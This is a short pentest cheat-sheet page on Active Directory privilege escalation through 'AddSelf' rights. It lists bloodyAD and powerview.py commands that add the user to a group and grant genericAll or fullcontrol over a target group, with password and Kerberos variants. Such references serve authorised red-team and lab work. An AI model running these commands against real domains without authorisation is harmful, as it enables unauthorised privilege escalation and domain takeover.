---
title: "AddSelf"
date: 2024-8-2
tags: ["addself", "active directory", "ad", "domain controller", "Windows", "powerview", "bloodAD", "privesc"]
---

### Privesc #1: Add self to group (From Linux)

{{< tab set1 tab1 active >}}bloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Add self to group

```console
# With password
python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember <GROUP> '<USER>'
```

```console
# With Kerberos
python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember <GROUP> '<USER>'
```

#### 2. Add genericAll over target group

```console
# With password
python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console
# With Kerberos
python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Connect

```console
sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

#### 2. Add self to group

```console
Add-DomainGroupMember -Identity <GROUP> -Members '<USER>'
```

```console
# Check
Get-DomainGroupMember -Identity <GROUP>
```

#### 4. Add fullcontrol over target group

```console
# Exit and login again to apply changes
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console
# Check
Get-DomainObjectAcl -Identity <TARGET_USER> -Where 'SecurityIdentifier contains <USER>'
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}
